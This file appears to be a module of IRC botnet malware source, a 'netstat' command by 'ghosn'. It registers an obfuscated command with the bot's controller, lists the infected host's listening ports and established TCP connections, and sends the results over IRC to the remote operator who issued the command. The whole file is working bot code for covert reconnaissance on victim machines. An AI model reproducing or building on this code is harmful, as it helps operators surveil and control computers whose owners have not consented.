// netstat - by ghosn

#include "main.h"
#include "mainctrl.h"
#include "netstat.h"
#include "irc.h"

CPortCheck::CPortCheck(){netstat  = new CNetstat;}

void CPortCheck::Init(){g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdCheck, dp(14,5,20,19,20,1,20,0), this);}

bool CPortCheck::HandleCommand(CMessage *pMsg){
if (!pMsg->sCmd.Compare(m_cmdCheck.sName.CStr())){
		//for wildcard
		iPort	         = atoi(pMsg->sChatString.Token(1," "));// optional port
		CString strState = pMsg->sChatString.CStr();			// optional state 
		//end wildcard

		int lType=0;
		if (strState.Find("-l")) lType=2; //listening
		else if (strState.Find("-e")) lType=1; //established		
					
		strcpy(netstat->display->specificProtocol, "DEF-TCP");
		netstat->display->allConnectAndListening = 1;
		char srcIpBuffer[128], dstIpBuffer[128], state[32], \
			fullSrcBuffer[140], fullDstBuffer[140], localPortName[16], \
			remotePortName[16];
		unsigned short localPort, remotePort;
		int x, y, curr, breakOut = 0;
		srcIpBuffer[sizeof(srcIpBuffer)-1] = 0;
		dstIpBuffer[sizeof(dstIpBuffer)-1] = 0;
		fullSrcBuffer[sizeof(fullSrcBuffer)-1] = 0;
		fullDstBuffer[sizeof(fullDstBuffer)-1] = 0;
		localPortName[sizeof(localPortName)-1] = 0;
		remotePortName[sizeof(remotePortName)-1] = 0;
		if ((netstat->display->allConnectAndListening) || 
			(!stricmp(netstat->display->specificProtocol, "DEF-TCP")) || 
			(!stricmp(netstat->display->specificProtocol, "TCP")))
		{
			DWORD tcpTableSize = sizeof(MIB_TCPTABLE) * 128;
			MIB_TCPTABLE *tcpTable = (MIB_TCPTABLE *)malloc(tcpTableSize);
			tcpTable->dwNumEntries = 0;
			GetTcpTable(tcpTable, &tcpTableSize, TRUE);
			for (x = 0; x < (int)tcpTable->dwNumEntries; x++)
			{
				breakOut = 0;
				if ((tcpTable->table[x].dwState == MIB_TCP_STATE_LISTEN) && 
					(!netstat->display->allConnectAndListening))
					continue;
				localPort = ntohs((unsigned short)(tcpTable->table[x].dwLocalPort & 0xFFFF));
				remotePort = ntohs((unsigned short)(tcpTable->table[x].dwRemotePort & 0xFFFF));
				ResolveAddress(tcpTable->table[x].dwLocalAddr, srcIpBuffer, sizeof(srcIpBuffer)-1, 1);
				ResolveAddress(tcpTable->table[x].dwRemoteAddr, dstIpBuffer, sizeof(dstIpBuffer)-1, 0);
				switch (tcpTable->table[x].dwState){
					case MIB_TCP_STATE_LISTEN:
						strcpy(state,"listening"); break;
					case MIB_TCP_STATE_ESTAB:
						strcpy(state,"established"); break;
				}
				memset(fullSrcBuffer, 0, sizeof(fullSrcBuffer));
				memset(fullDstBuffer, 0, sizeof(fullDstBuffer));
				if (tcpTable->table[x].dwState == MIB_TCP_STATE_LISTEN) remotePort = 0;
				_snprintf(fullSrcBuffer, sizeof(fullSrcBuffer) - 1, "%s:%d", srcIpBuffer, localPort);
				_snprintf(fullDstBuffer, sizeof(fullDstBuffer) - 1, "%s:%d", dstIpBuffer, remotePort);
				CString sCheckResult;

				if (remotePort == 0 && lType != 1) {
					if(iPort!=0)if(iPort!=localPort)continue;
					sCheckResult.Format("%s: %d", state, localPort);
					g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent,pMsg->bNotice, sCheckResult.Str(), pMsg->sReplyTo.Str()); 
				} else if(remotePort != 0 && lType != 2) {
					if(iPort!=0)if(iPort!=remotePort)continue;
					sCheckResult.Format("%s: %s", state, fullDstBuffer);
					g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent,pMsg->bNotice, sCheckResult.Str(), pMsg->sReplyTo.Str());
				}		
			}
			free(tcpTable);	
		}
		
	}
	return true;
}

void CPortCheck::ResolveAddress(unsigned long addr, char *buf, unsigned long bufSize, unsigned char isSrcAddress)
{
	struct hostent *h;
	unsigned long bufLength;
	bufLength = _snprintf(buf, bufSize, "%d.%d.%d.%d", 
						 	((unsigned char *)&addr)[0],
						 	((unsigned char *)&addr)[1],
						 	((unsigned char *)&addr)[2],
						 	((unsigned char *)&addr)[3]);
	if (netstat->dontResolve)return;
	if ((isSrcAddress) || (addr == 0)){
		char hostname[30];
		memset(hostname, 0, 30);
		if (gethostname(hostname, sizeof(hostname) - 1) == 0)
			strncpy(buf, hostname, bufSize);
	}
	else if ((h = gethostbyaddr((const char *)&addr, 4, AF_INET)))
		strncpy(buf, h->h_name, bufSize);
}